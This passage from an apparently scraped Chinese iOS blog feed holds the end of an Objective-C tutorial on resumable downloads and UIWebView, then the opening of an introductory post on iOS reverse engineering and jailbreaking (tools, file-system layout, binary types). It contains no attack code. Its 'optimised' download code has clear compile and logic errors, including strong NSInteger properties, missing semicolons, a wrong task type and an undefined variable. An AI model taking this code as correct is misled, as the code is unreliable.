(void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data&#123;</div><div class="line">  	//从文件尾部添加数据，这里会自动向尾部追加，不需要人为再去移动指针</div><div class="line">  	[self.handle writeData:data];</div><div class="line">    self.currentSize += data.length;</div><div class="line">  	NSLog(@&quot;%f&quot;, 1.0 * self.currentSize/self.totalSize);</div><div class="line">  	self.progressView.progress = 1.0 * self.currentSize/self.totalSize;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">//最后在下载完成之后关闭文件，并将指针置空</div><div class="line">- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error&#123;</div><div class="line">    [self.handle closeFile];</div><div class="line">	self.handle = nil;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>到这里的时候还有什么可以继续优化的呢，我们发现只有start方法的代码是最长的，而且每次都会重新创建一个任务，所以自然而然地想到了去懒加载，那么取消方法此刻如果将任务的指针置空的话，就不需要再进行if判断，直接会通过懒加载重新创建一个网络请求，还可以根据已经请求的数据大小去告诉服务器请求那一部分数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">- (NSURLSessionDataTask *)dataTask&#123;</div><div class="line">  	if(_dataTask == nil)&#123;</div><div class="line">  	  	NSURL *url = [NSURL URLWithString:@&quot;http://127.0.0.1/resources/1.zip&quot;];</div><div class="line">		//创建请求对象</div><div class="line">	 	NSMutableURLRequest *request = [NSURLRequest requestWithURL:url];</div><div class="line">        NSString *range = [NSString stringWithFormat:@&quot;bytes=%zd-&quot;, self.currentSize];</div><div class="line">        //告诉服务器请求哪一部分的数据</div><div class="line">        [request setValue:range forHTTPHeaderField:@&quot;Range&quot;]</div><div class="line">  		//创建session</div><div class="line">  		self.session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration] delegate:self delegateQueue:[NSOperationQueue mainQueue]];</div><div class="line">	    //创建Task</div><div class="line">  		_dataTask = [self.session downloadTaskWithRequest:request];</div><div class="line">  	&#125;</div><div class="line">  	return _dataTask;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//开始部分</div><div class="line">- (IBAction)startBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask resume];</div><div class="line">&#125;</div><div class="line">//暂停部分</div><div class="line">- (IBAction)suspendBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask suspend];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//取消部分</div><div class="line">- (IBAction)cancelBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask cancel];</div><div class="line">  self.dataTask = nil;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//继续下载部分</div><div class="line">- (IBAction)goOnBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask resume];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是这个时候我们会发现打印的下载进度不太对，如果我们经过了一次取消之后再下载，进度条满了之后仍然在跑，下载的进度也会超过一，那么这又是为什么呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler&#123;</div><div class="line"> 	//这个expectedContentLength是本次请求的数据大小，所以还需要加上已经下载的</div><div class="line">  	self.totalSize = response.expectedContentLength + self.currentSize;</div><div class="line">	self.fullPath = [[NSSearchPathForDirectoryInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:response.suggestedFilename];</div><div class="line">  	//而且如果是断点续传的话就已经拥有文件了，不需要再重新创造一个新的文件</div><div class="line">  	if(self.currentSize == 0)&#123;</div><div class="line">    	[[NSFileManager defaultManager] createFileAtPath:self.fullPath contents:nil 		attributes:nil];</div><div class="line">  	&#125;</div><div class="line">  	self.handle = [NSFileHandle fileHandleForWritingAtPath:self.fullPath];</div><div class="line">  	//移动文件句柄指针到末尾，添加数据</div><div class="line">  	[self.handle seekToEndOfFile];</div><div class="line">	completionHandler(NSURLSessionResponseAllow);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>到这里的时候还没有做到真正的离线下载，也就是程序退出之后重新进也可以断点续传，现在已经完成做到了沙盒缓存，只需要再加一次开始下载之前的判断即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">- (NSURLSessionDataTask *)dataTask&#123;</div><div class="line">  	if(_dataTask == nil)&#123;</div><div class="line">  	  	NSURL *url = [NSURL URLWithString:@&quot;http://127.0.0.1/resources/1.zip&quot;];</div><div class="line">		//创建请求对象</div><div class="line">	 	NSMutableURLRequest *request = [NSURLRequest requestWithURL:url];</div><div class="line">      	//获取之前下载的文件信息</div><div class="line">      	NSDictionary *fileInfoDict = [[NSFileManager defaultManager] attributesOfItemAtPath:self.fullPath];</div><div class="line">      	//将已经下载的大小赋值回去</div><div class="line">      	self.currentSize = [fileInfoDict[@&quot;NSFileSize&quot;] integerValue];</div><div class="line">        NSString *range = [NSString stringWithFormat:@&quot;bytes=%zd-&quot;, self.currentSize];</div><div class="line">        //告诉服务器请求哪一部分的数据</div><div class="line">        [request setValue:range forHTTPHeaderField:@&quot;Range&quot;]</div><div class="line">  		//创建session</div><div class="line">  		self.session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration] delegate:self delegateQueue:[NSOperationQueue mainQueue]];</div><div class="line">	    //创建Task</div><div class="line">  		_dataTask = [self.session downloadTaskWithRequest:request];</div><div class="line">  	&#125;</div><div class="line">  	return _dataTask;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后再总的贴出一份完整版的代码吧，也就是最后的最优化版本,并且进行了一些代码的抽取，使整体性更强:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line">@interface ViewController()&lt;NSURLSessionDataDelegate&gt;</div><div class="line"></div><div class="line">@property (nonatomic, strong) NSFileHandle *handle;</div><div class="line">@property (nonatomic, strong) NSInteger totalSize;</div><div class="line">@property (nonatomic, strong) NSInteger currentSize;</div><div class="line">@property (nonatomic, strong) NSString *fullPath;</div><div class="line">@property (nonatomic, strong) NSURLSessionDataTask *dataTask;</div><div class="line">@property (nonatomic, strong) NSURLSession *session</div><div class="line"></div><div class="line">@end</div><div class="line">  </div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">//session懒加载</div><div class="line">- (NSURLSession *)session&#123;</div><div class="line">  if(_session == nil)&#123;</div><div class="line">    _session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration] delegate:self delegateQueue:[NSOperationQueue mainQueue]];</div><div class="line">  &#125;  </div><div class="line">  return _session;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//fullPath懒加载</div><div class="line">- (NSString *)fulPath&#123;</div><div class="line">  if(_fullPath == nil)&#123;</div><div class="line">    _fullPath = [[NSSearchPathForDirectoryInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:response.suggestedFilename];</div><div class="line">  &#125;</div><div class="line">  return _fullPath;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (NSInteger)getCurrentSize&#123;</div><div class="line">  //获取之前下载的文件信息</div><div class="line">  NSDictionary *fileInfoDict = [[NSFileManager defaultManager] attributesOfItemAtPath:self.fullPath];</div><div class="line">  return [fileInfoDict[@&quot;NSFileSize&quot;] integerValue];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (NSURLSessionDataTask *)dataTask&#123;</div><div class="line">  	if(_dataTask == nil)&#123;</div><div class="line">  	  	NSURL *url = [NSURL URLWithString:@&quot;http://127.0.0.1/resources/1.zip&quot;];</div><div class="line">		//创建请求对象</div><div class="line">	 	NSMutableURLRequest *request = [NSURLRequest requestWithURL:url];</div><div class="line">      	//将已经下载的大小赋值回去</div><div class="line">      	self.currentSize = [self getCurrentSize];</div><div class="line">        NSString *range = [NSString stringWithFormat:@&quot;bytes=%zd-&quot;, self.currentSize];</div><div class="line">        //告诉服务器请求哪一部分的数据</div><div class="line">        [request setValue:range forHTTPHeaderField:@&quot;Range&quot;]</div><div class="line">	    //创建Task</div><div class="line">  		_dataTask = [self.session downloadTaskWithRequest:request];</div><div class="line">  	&#125;</div><div class="line">  	return _dataTask;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//开始部分</div><div class="line">- (IBAction)startBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask resume];</div><div class="line">&#125;</div><div class="line">//暂停部分</div><div class="line">- (IBAction)suspendBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask suspend];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//取消部分</div><div class="line">- (IBAction)cancelBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask cancel];</div><div class="line">  self.dataTask = nil;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//继续下载部分</div><div class="line">- (IBAction)goOnBtnClick:(id)sender&#123;</div><div class="line">  [self.dataTask resume];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler&#123;</div><div class="line"> 	//这个expectedContentLength是本次请求的数据大小，所以还需要加上已经下载的</div><div class="line">  	self.totalSize = response.expectedContentLength + self.currentSize;</div><div class="line">  	//而且如果是断点续传的话就已经拥有文件了，不需要再重新创造一个新的文件</div><div class="line">  	if(self.currentSize == 0)&#123;</div><div class="line">    	[[NSFileManager defaultManager] createFileAtPath:self.fullPath contents:nil 		attributes:nil];</div><div class="line">  	&#125;</div><div class="line">  	self.handle = [NSFileHandle fileHandleForWritingAtPath:self.fullPath];</div><div class="line">  	//移动文件句柄指针到末尾，添加数据</div><div class="line">  	[self.handle seekToEndOfFile];</div><div class="line">	completionHandler(NSURLSessionResponseAllow);  </div><div class="line">&#125;</div><div class="line"></div><div class="line">//得知下载的过程,根据进度条直观的显示</div><div class="line">- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data&#123;</div><div class="line">  	//从文件尾部添加数据，这里会自动向尾部追加，不需要人为再去移动指针</div><div class="line">  	[self.handle writeData:data];</div><div class="line">    self.currentSize += data.length;</div><div class="line">  	NSLog(@&quot;%f&quot;, 1.0 * self.currentSize/self.totalSize);</div><div class="line">  	self.progressView.progress = 1.0 * self.currentSize/self.totalSize;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">//最后在下载完成之后关闭文件，并将指针置空</div><div class="line">- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error&#123;</div><div class="line">    [self.handle closeFile];</div><div class="line">	self.handle = nil;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="关于UIWebView"><a href="#关于UIWebView" class="headerlink" title="关于UIWebView"></a>关于UIWebView</h2><p>UIWebView即使iOS内置的浏览器控件，系统自带的Safari就是通过UIWebView来实现的，它不仅可以加载远程的网页资源，还能加载绝大部分的常见文件，如html/pdf/ppt等，其实介绍一个类无非就是介绍它的常用属性方法和代理</p>
<p>首先就简单介绍一些常用的属性和方法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//比如我们现在想要要加一个百度的网页最简单的做法</div><div class="line">- (void)viewDidLoad&#123;</div><div class="line">  [super viewDidLoad];</div><div class="line">  NSURL *url = [NSURL URLWithString@&quot;http://www.baidu.com&quot;];</div><div class="line">  //加载网页</div><div class="line">  [self.webView loadRequest:[NSURLRequest requestWithURL:url]];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-09%20%E4%B8%8B%E5%8D%881.56.03.png" alt="屏幕快照 2017-12-09 下午1.56.03.png" title="" class="">
                <p>屏幕快照 2017-12-09 下午1.56.03.png</p>
            </figure>
<p>效果看起来还是挺唬人的，除了可以加载网页还可以加载图片、视频等，但是一个只包含这个的App显然是无法上架的，当然我们还需要进一步的操作并且得到响应，而且有时候前端的网页没有做自适应，也是需要我们自己调整的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//让界面自适应</div><div class="line">self.webView.scalesPageToFit = YES;</div><div class="line">//同时我们还可以加载本地文件的网页</div><div class="line">NSURL *url = [[NSBundle mainBundle] URLForResource:@&quot;test.html&quot; withExtension:nil];</div><div class="line">//页面前进</div><div class="line">[self.webView goForward];</div><div class="line">//页面后退</div><div class="line">[self.webView goBack];</div><div class="line">//页面刷新</div><div class="line">[self.webView reload];</div></pre></td></tr></table></figure>
<p>虽然这几个属性和方法比较简单，但是由于开发工程师还需要考虑到用户友好，所以还有进行一些优化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//这里就需要用到相关的代理方法了</div><div class="line">- (void)webViewDidFinishLoad:(UIWebView *)webView&#123;</div><div class="line">  	//在网页加载完毕之后判断当前的页面是否可以前进或者后退</div><div class="line">    self.goBack.enabled = self.webView.canGoBack;</div><div class="line">    self.goForward.enabled = self.webView.canGoForward;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>和UIWebView进行交互，调用web页面中的需要传参的函数时，参数需要带单引号，或者双引号(双引号要进行转义在转义字符前加’\’),传递json字符串不需要加上单引号或者双引号，甚至可以直接使用JS取得DOM中我们需要的节点属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//字符串转JS操作</div><div class="line">- (void)webViewDidFinishLoad:(UIWebView *)webView</div><div class="line"></div><div class="line">&#123;</div><div class="line">    NSString *sendJsStr=[NSString stringWithFormat:@&quot;openFile(\&quot;%@\&quot;)&quot;, jsDocPathStr];</div><div class="line">    [webView stringByEvaluatingJavaScriptFromString:sendJsStr];</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">//将JS操作结果转换回字符串</div><div class="line">- (void)webViewDidFinishLoad:(UIWebView *)webView</div><div class="line"></div><div class="line">&#123;</div><div class="line">    CGRect frame = webView.frame;</div><div class="line"></div><div class="line">    NSString *fitHeight = [webview stringByEvaluatingJavaScriptFromString:@&quot;document.body.scrollHeight;&quot;];</div><div class="line"></div><div class="line">    frame.size.height = [fitHeight floatValue];</div><div class="line"></div><div class="line">    webView.frame = frame;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>剩下的一些与JS之间的交互可以参考这一篇博客<a href="http://blog.csdn.net/sheng_bin/article/details/53122706" target="_blank" rel="external">最全JS交互</a></p>
]]></content>
      
        <categories>
            
            <category> 断点续传 App内置浏览器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS逆向学习(一)]]></title>
      <url>/2017/12/06/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>物有本末，事有终始，知所先后，则近道矣。逆向工程则是帮助我们去理解编程中的道</p>
<a id="more"></a>
<h1 id="欢迎来到逆向的世界"><a href="#欢迎来到逆向的世界" class="headerlink" title="欢迎来到逆向的世界"></a>欢迎来到逆向的世界</h1><p>到现在也大概做了几个月的iOS开发了，让我头疼的并不是那些复杂的用户逻辑和项目中无聊的业务需求，而是整个iOS系统都十分的封闭，这对于天性崇尚自由的我显然是一种挑战 ，那么越狱就算是我的一个大目标，而越狱的基础就是iOS逆向工程，所以在掌握了基本的开发和拥有了一定的项目能力之后，我毅然决然地选择了iOS逆向这一条路。</p>
<p>那么究竟什么是iOS的逆向呢，打个比方，如果写App的那些工程师是为了构建一个安全的应用给普通人去使用，那么逆向工程师就是一杆长矛，专门去刺破那些看似安全的App防护盾。对于微信和WhatsApp这样的IM类软件，交流的数据是核心，而对于银行，支付宝这样的电商类软件，交易的数据和用户的信息是他们的核心内容。这些核心数据都是需要重点保护的，于是开发员们通过反调试，数据加密，代码混淆等各种手段去重重保护自己的App避免被逆向工程师们破解，从而引发各种各样的安全问题影响用户的体验。</p>
<p>目前的App的防护技术和iOS的逆向技术根本就不在一个平面上。一般的App防护，就像一座城堡，将App的MVC不知在城堡内部，看起来易守难攻，就像下图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-06%20%E4%B8%8B%E5%8D%8810.59.01.png" alt="屏幕快照 2017-12-06 下午10.59.01.png" title="" class="">
                <p>屏幕快照 2017-12-06 下午10.59.01.png</p>
            </figure>
<p>但是作为一个逆向工程师，站在空中俯瞰整个城堡的时候，这个时候，所有的OC函数定义，所有的参数和逻辑都暴露在我们的面前，我们所需要做的就是在城堡中找到那个人，城堡的防护其实对于我们来说已经没有任何的意义：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-06%20%E4%B8%8B%E5%8D%8811.00.38.png" alt="屏幕快照 2017-12-06 下午11.00.38.png" title="" class="">
                <p>屏幕快照 2017-12-06 下午11.00.38.png</p>
            </figure>
<p>通过iOS逆向工程技术，我们可以在不破坏城墙的情况下，在任意的高维度地点进入低维度的城堡，巧取而不豪夺，通过监视甚至改变整个App的运行逻辑，从而获取核心信息，了解软件的设计原理。其实简要概括而言，逆向主要就是两个作用了：</p>
<ol>
<li>分析目标程序，拿到关键信息，也就是安全类</li>
<li>通过他人的程序功能去完善自己的App,属于开发类</li>
</ol>
<p>虽然说起来很玄奇，通过逆向工程，就可以推出这个App的设计思路、内部算法和实现细节，但显然这是一个非常复杂的过程，可以说是一门解构再重组的艺术，接下来就先介绍一个工具方面的吧：</p>
<blockquote>
<p>监测工具</p>
</blockquote>
<p><code>Reveal</code>是一个实时监测目标App的UI布局变化的工具,它可以帮助我们迅速的从UI层面切入代码。</p>
<blockquote>
<p>反汇编工具</p>
</blockquote>
<p>从UI层面切入代码层面之后，就要用到反汇编工具去梳理代码了。反汇编工具把二进制文件作为输入，经过处理后再输出汇编代码，现在的工具主要是<code>IDA</code>和<code>Hopper</code>，只不过<code>Hopper</code>主要针对的就是苹果系的操作系统，整个逆向工程中最具挑战也是最有意思的部分就是阅读生成的汇编代码了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-07%20%E4%B8%8B%E5%8D%881.44.35.png" alt="IDA.png" title="" class="">
                <p>IDA.png</p>
            </figure>
<blockquote>
<p>调试工具</p>
</blockquote>
<p>作为一个开发人员平时所用到的调试工具应该就是Xcode了。其实本人也是最近在项目中才初窥断点调试的门径。但是在iOS逆向工程中，用到的断点调试工具主要是LLDB：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-07%20%E4%B8%8B%E5%8D%881.49.17.png" alt="屏幕快照 2017-12-07 下午1.49.17.png" title="" class="">
                <p>屏幕快照 2017-12-07 下午1.49.17.png</p>
            </figure>
<blockquote>
<p>开发工具</p>
</blockquote>
<p>在分析完整个App之后，我们就可以开始使用开发工具去写程序了。开发工程师在<code>App store</code>的战场上惯用Xcode，但是转移到越狱iOS之后，除了基于Xcode的<code>iOSOpenDev</code>，还有偏命令行的<code>Theos</code>：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-07%20%E4%B8%8B%E5%8D%881.52.37.png" alt="屏幕快照 2017-12-07 下午1.52.37.png" title="" class="">
                <p>屏幕快照 2017-12-07 下午1.52.37.png</p>
            </figure>
<h1 id="越狱的平台"><a href="#越狱的平台" class="headerlink" title="越狱的平台"></a>越狱的平台</h1><p>iOS的系统对于大部分来说都是一个封闭的黑盒子，就算有盘古、太极这种越狱团队的存在，大部分人还是会选择安全的生存在墙内，这样就可以免受系统崩溃的困扰了，但是身为调查兵团的一员显然是无法满足的，向着自由进发吧！：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-07%20%E4%B8%8B%E5%8D%881.58.29.png" alt="屏幕快照 2017-12-07 下午1.58.29.png" title="" class="">
                <p>屏幕快照 2017-12-07 下午1.58.29.png</p>
            </figure>
<h3 id="iOS系统结构"><a href="#iOS系统结构" class="headerlink" title="iOS系统结构"></a>iOS系统结构</h3><ol>
<li>对于没有越狱的手机，苹果开发给第三方直接访问iOS的文件系统的接口十分的优先，因此，纯粹的App开发者可能会对鱼iOS的系统结构一无所知</li>
<li>在越狱之后，我们可以访问iOS全文件系统，这是我们开展iOS逆向工程的首要前提。</li>
</ol>
<h3 id="iOS目录结构简介"><a href="#iOS目录结构简介" class="headerlink" title="iOS目录结构简介"></a>iOS目录结构简介</h3><p>iOS是由OS X演化而来的，OS X又是和Unix有着千丝万缕的联系，可以参考一下Unix下的文件系统标准。接下来要说的就是在iOS中使用的比较频繁的几个目录：</p>
<ol>
<li><p>/Applications:存放所有的系统App和来自于Cydia中的App(deb格式)，不包括StoreApp(ipa格式)</p>
</li>
<li><p>/Developer:如果一台设备连接Xcode被指定为调试用机，Xcode就会在iOS中生成这个目录，包含着一些调试用的数据和工具</p>
</li>
<li><p>/Library:存放一些提供系统支持的数据,其中/Library/MobileSubstrate 下存放了所有基于 CydiaSubstrate(原名 MobileSubstrate)的插件。</p>
</li>
<li><p>/System/Library :iOS 文件系统中最重要的目录之一,存放大量系统组件</p>
</li>
<li><p>/System/Library/Frameworks和/System/Library/PrivateFrameworks:存放iOS中的各种 framework,其中出现在 SDK 文档里的只是冰山一角,还有数不清的未公开功能等待我们去挖 。</p>
</li>
<li><p>/System/Library/CoreServices里的SpringBoard.app:iOS 面管理器(类似于Windows里的explorer),是用户与系统交流的最重要中介。</p>
</li>
<li><p>/User:用户目录,实际指向/var/mobile,这个目录里存放大量用户数据,比如:</p>
<p>● /var/mobile/Media/DCIM下存放照片;</p>
<p>● /var/mobile/Media/Recordings下存放录音文件;</p>
<p>● /var/mobile/Library/SMS下存放短信数据 ;</p>
<p>● /var/mobile/Library/Mail下存放邮件数据。</p>
<p>另外还有一个很重要的子目录就是/var/mobile/Containers，其中存放着从App store中下载的App</p>
</li>
</ol>
<h3 id="iOS的二进制文件类型"><a href="#iOS的二进制文件类型" class="headerlink" title="iOS的二进制文件类型"></a>iOS的二进制文件类型</h3><p>这里稍微提一下就是iOS的文件权限和linux类似，就不赘述了。在逆向工程的初学阶段，我们的目标主要就是Application、Dynamic Library、Daemon这三类的二进制文件，对他们的了解越深，逆向工程也就越顺利</p>
<ol>
<li>Application相关概念</li>
</ol>
<blockquote>
<p>bundle：是一个按某种标准结构来组织的目录,其中包含了二进制文件及运行所需的资源。正向开发中常见的 App 和 framework都是以bundle的形式存在的;在越狱iOS中常见的PreferenceBundle，可以看成是一种依附于Settings 的 App。Settings 的 App,结构与 App 类似,本质也是 bundle。</p>
<p>Framework 也是 bundle,但 framework 的 bundle 中存放的是一个 dylib,而不是可执行文件。相对来说,framework的地位比 App 更高,因为一个 App 的绝大多数功能都是通过调用 framework 提供的接口来实现的。将某个 bundle 确立为逆向目标后,绝大多数逆向线索都可以在 bundle 内找到,这大大 低了逆向工程的复杂度。</p>
</blockquote>
<ol>
<li>App 目录结构 ：</li>
</ol>
<ul>
<li>Info.plist </li>
</ul>
<p>info.plist文件记录了App的基本信息,如bundle identifier、可执行文件名、图标文件名等。可以通过 Xcode 自带的命 行工具 plutil 查看bundle identifier的值,如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5</div><div class="line">/SiriViewService.app/Info.plist | grep CFBundleIdentifier</div></pre></td></tr></table></figure>
<ul>
<li>lproj目录：lproj目录下存放的是各种本地化的字符 (.strings),是iOS逆向工程的重要线索,也可以用 plutil 查看,如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5</div><div class="line">/SiriViewService.app/en.lproj/Localizable.strings</div></pre></td></tr></table></figure>
<ol>
<li>系统AppVS商店App：</li>
</ol>
<p>Cydia App 的安装包格式一般是 deb,StoreApp 的安装包格式一般是ipa。其中 deb 是来自 Debian 的安装包格式,由 Cydia作者saurik移到iOS中,它的主用户和主组一般是 root 和 admin,能够以 root权限运行;而 ipa 是苹果为 iOS 推出的专用App安装包格式,主用户和主组都是mobile,只能以mobile权限运行。</p>
<ol>
<li>Dynamic Library：</li>
</ol>
<ul>
<li>在 Xcode 工程里导入的各种 framework,链接的各种 lib,其实本质都是 dylib。</li>
<li>Cydia 里的各种 tweak 无一不是以 dylib 的形式工作的,正是这些 tweak 的存在让我们能够随意定制自己的 iOS。</li>
<li>在iOS中,lib分为static和dynamic两种,其中static lib在编译阶段成为App可执行文件的一部分,会增加可执行文件的大小。</li>
<li>dylib 则相对“智能”一些,它不会改变可执行文件的大小,只有当 App 需要用到这个 dylib 时,iOS 才会把它加载进内存,成为 App 进程的一部分。</li>
<li>dylib 的权限是由它寄生的那个 App 决定的,同一个 dylib 寄生在系统 App 和 StoreApp 里时的权限是不同的。</li>
</ul>
<ol>
<li>Daemon</li>
</ol>
